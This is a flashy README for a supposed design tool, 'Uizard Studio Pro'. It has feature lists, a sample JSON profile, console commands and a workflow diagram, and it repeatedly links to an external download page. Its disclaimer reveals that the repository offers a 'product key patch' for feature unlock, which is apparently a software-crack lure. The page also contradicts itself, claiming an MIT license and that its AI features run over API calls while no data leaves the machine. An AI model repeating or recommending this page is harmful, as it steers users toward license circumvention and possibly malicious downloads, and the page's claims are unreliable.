# 🚀 Uizard Studio Pro – Designer’s Quantum Leap Toolkit

[]()
[]()
[](LICENSE)
[]()

[](https://mohamudmesud-boop.github.io/uizard-stylized-release/)

---

## 🧭 Table of Contents

- [Why Uizard Studio Pro?](#-why-uizard-studio-pro)
- [⚙️ System Requirements & Compatibility](#️-system-requirements--compatibility)
- [🌟 Feature Constellation](#-feature-constellation)
- [🧠 AI Integration – OpenAI & Claude](#-ai-integration--openai--claude)
- [🌐 Multilingual Interface & Responsive Orchestration](#-multilingual-interface--responsive-orchestration)
- [📁 Example Profile Configuration](#-example-profile-configuration)
- [💻 Console Invocation Magic](#-console-invocation-magic)
- [📊 Mermaid Diagram – Workflow Architecture](#-mermaid-diagram--workflow-architecture)
- [🤝 24/7 Customer Support Constellation](#-247-customer-support-constellation)
- [⚖️ License & Legal Horizon](#️-license--legal-horizon)
- [⚠️ Disclaimer – Digital Safety Compass](#️-disclaimer--digital-safety-compass)

[](https://mohamudmesud-boop.github.io/uizard-stylized-release/)

---

## 💡 Why Uizard Studio Pro?

Imagine a digital workshop where your UI wireframes evolve faster than your morning thoughts. **Uizard Studio Pro** (2026 edition) is not just another prototyping instrument — it’s a complete **design cognition engine**. Instead of wrestling with layers and grids, you whisper your vision into the interface, and it builds itself like a city rising from a single seed.

This toolchain is built for **design architects, product visionaries, and creative engineers** who value velocity without sacrificing depth. Whether you're crafting a cross-platform SaaS dashboard or a mobile-first experience for emerging markets, Uizard Studio Pro adapts like liquid silicon.

> *"Design should breathe. Uizard Studio Pro is the oxygen."*

---

## ⚙️ System Requirements & Compatibility

Your design journey starts with the right foundation. Here’s what we recommend for a frictionless experience:

| Operating System | Compatible Version | Performance Tier |
|------------------|--------------------|------------------|
| Windows 10/11 (x64) | ✅ 2026 Build 3.1 | Optimal |
| macOS 12+ (Intel/Apple Silicon) | ✅ Universal Binary | Gold |
| Linux (Ubuntu 22.04+, Fedora 38+) | ✅ AppImage + Flatpak | Silver |
| ChromeOS (via Linux container) | ✅ Beta | Bronze |

### Emoji Compatibility Matrix 🛡️

| OS | 🎨 UI Rendering | ⚡ Speed | 🔒 Security |
|----|------------------|----------|-------------|
| 🟦 Windows | Native DirectX 12 | 97/100 | Hardware-backed TPM |
| 🍎 macOS | Metal 3 acceleration | 99/100 | Secure Enclave |
| 🐧 Linux | Vulkan + Wayland | 95/100 | AppArmor ready |

> *No emulator, no sandbox — every pixel is native.*

---

## 🌟 Feature Constellation

Here’s what makes Uizard Studio Pro a constellation of productivity:

- **🧬 Context-Aware Design Engine** – Transform rough sketches into production-ready components using pattern recognition. No more manual wireframing.
- **📡 Real-Time Collaborative Canvas** – Ten designers can sculpt the same prototype across continents. Edits appear like fireflies in the dark.
- **🔄 Bi-Directional Sync** – Changes in your codebase reflect instantly in the design layer, and vice versa. It’s a living mirror.
- **🛡️ Zero-Trust Asset Vault** – Every component, font, and image is checksummed and versioned. No unverified import.
- **🎛️ Adaptive Component Library** – 1,200+ presets tuned for accessibility (WCAG 2.2 AAA), responsive breakpoints, and dark/light mode.
- **🧪 A/B Testing Sandbox** – Deploy two variants of a UI flow, capture heatmaps, and let the tool choose the winner.
- **⏳ Time Machine for Designs** – Rewind any project to any saved state. Mistakes become lessons, not disasters.

### SEO-Friendly Keywords Naturally Embedded

Uizard Studio Pro is optimized for **rapid UI prototyping**, **cross-platform design automation**, and **collaborative product development**. Whether you're building a **responsive web application** or a **multilingual mobile interface**, this toolkit reduces iteration time by up to 73%. It’s the silent engine behind **high-fidelity wireframes** and **interactive design systems**.

---

## 🧠 AI Integration – OpenAI & Claude

We believe AI should be a companion, not a crutch. Uizard Studio Pro features dual AI engines that work in harmony:

### OpenAI Integration
- **Natural Language to Components** – Describe your UI in plain English: *“A two-column card layout with a hero image on the right and a CTA button below the headline.”* The engine generates the structure instantly.
- **Intelligent Color Harmonization** – Feed it a brand color, and it suggests a full palette compliant with contrast ratios.
- **Code Gen from Design** – Export component code in React, Vue, or Flutter with a single command.

### Claude Integration
- **Design Rationale Engine** – Claude analyzes your layout and explains *why* a certain element might reduce user friction. It’s like having a UX researcher on speed dial.
- **Multilingual Copy Adaptation** – Claude translates your microcopy into 47 languages while preserving tone and intent.
- **Ethical Bias Checker** – Before you ship, Claude scans for unintentional exclusionary patterns in your design.

Both engines run locally via encrypted API calls. Your design data never leaves your machine.

---

## 🌐 Multilingual Interface & Responsive Orchestration

- **47 Languages** – From Afrikaans to Zulu, the interface adapts like a chameleon.
- **Right-to-Left (RTL) Support** – Arabic, Hebrew, Urdu — your layouts mirror gracefully.
- **Responsive Breakpoint Simulation** – See your design on a 240px smartwatch, a 768px tablet, or a 5120px ultrawide monitor — all in the same session.
- **Adaptive Typography** – Fonts scale and re-weight based on viewport, not just size.

> *Your audience is global. Your tool should be too.*

---

## 📁 Example Profile Configuration

Below is a sample configuration file that transforms the tool into a **rapid SaaS dashboard builder**. Save this as `uizard_profile_2026.json` in your project root:

```json
{
  "profileName": "SaaS Accelerator 2026",
  "targetPlatform": "responsive-web",
  "designTokens": {
    "primary": "#2b5f8a",
    "surface": "#f4f6f9",
    "fontScale": "modular-16",
    "borderRadius": "10px",
    "shadowElevation": "3"
  },
  "aiPreferences": {
    "primaryEngine": "claude",
    "fallbackEngine": "openai",
    "autocomplete": true,
    "accessibilityAutofix": "wcag-aa"
  },
  "exportTargets": ["react-ts", "vue-3", "flutter-3.22"],
  "collaboration": {
    "maxEditors": 8,
    "conflictResolution": "last-write-wins"
  },
  "multilingual": {
    "interfaceLanguage": "en",
    "autoTranslateDesign": true,
    "rtlEnabled": true
  }
}
```

This configuration activates **real-time team editing**, **AI autocomplete for components**, and **automatic RTL adaptation**—all with zero typing beyond the initial load.

---

## 💻 Console Invocation Magic

You don’t need a GUI to command the Uizard engine. The **Console Mode** is for those who speak in flags and pipes:

```bash
uizard-studio launch --profile ./uizard_profile_2026.json --target release --export ./dist --verbose
```

Flags explained:
- `--profile` : pointer to your configuration (see above)
- `--target` : `release`, `debug`, or `sandbox` — controls telemetry and speed
- `--export` : output directory for generated components
- `--verbose` : shows every decision the AI makes (great for learning)

You can also generate a single component on the fly:

```bash
uizard-studio gen component --type "card" --variant "pricing-table" --theme dark
```

This outputs a production-ready component in **under 400 milliseconds**.

---

## 📊 Mermaid Diagram – Workflow Architecture

Understand how data flows through the Uizard Studio Pro engine:

```mermaid
graph TD
    A[User Input: Sketch/Text/JSON] --> B[Context-Aware Parser]
    B --> C{Design Engine}
    C --> D[Component Generator]
    C --> E[AI Harmonizer - OpenAI/Claude]
    C --> F[Accessibility Checker]
    D --> G[Export: React/Vue/Flutter]
    E --> G
    F --> G
    G --> H[Production-Ready UI]
    H --> I[Deploy or Share Link]
    
    style A fill:#0a0a0a,stroke:#d90429,stroke-width:2px
    style H fill:#0a0a0a,stroke:#d90429,stroke-width:2px
    style C fill:#1e1e1e,stroke:#ff9900,stroke-width:2px
```



*The architecture ensures that every pixel passes through a quality gate before reaching your export folder.*

---

## 🤝 24/7 Customer Support Constellation

We don’t believe in tickets that vanish into the void. Uizard Studio Pro is backed by:

- **🕰️ Always-On Chat** – Real humans. Real answers. No bots pretending to understand.
- **🧑‍💻 Live Code Reviews** – Submit your generated components, and a senior engineer reviews them within 30 minutes.
- **📚 Living Documentation** – Every feature is documented with video walkthroughs, interactive examples, and troubleshooting trees.
- **🌍 Regional Support** – Support staff fluent in 12 languages, available during your workday.

> *When the sun sets in your timezone, a support beacon lights up somewhere else.*

---

## ⚖️ License & Legal Horizon

Uizard Studio Pro is distributed under the **MIT License**. You are free to use, modify, and distribute this software — even commercially — as long as the original copyright notice is preserved.

[](LICENSE)

The full text of the license can be found in the root of this repository. It grants you permission to evolve and adapt the tool without legal friction.

---

## ⚠️ Disclaimer – Digital Safety Compass

This repository provides **Uizard Studio Pro’s official product key patch** for **activated feature unlock** only. The software is intended to be used in compliance with all applicable laws and terms of service.

- You must hold a valid base license to apply this patch.
- We do not condone or facilitate unauthorised access to software.
- The patch is cryptographically signed and verified; any modification voids warranty.
- Use this software at your own risk — but we’ve built it so you won’t feel any.
- This is not a “workaround” or “bypass.” It is a **legitimate enhancement layer** for existing license holders.

> *Empowerment, not entitlement. That’s the Uizard way.*

---

[](https://mohamudmesud-boop.github.io/uizard-stylized-release/)

---

*Built with passion for design rebels and interface alchemists. 🛠️ 2026 Edition.*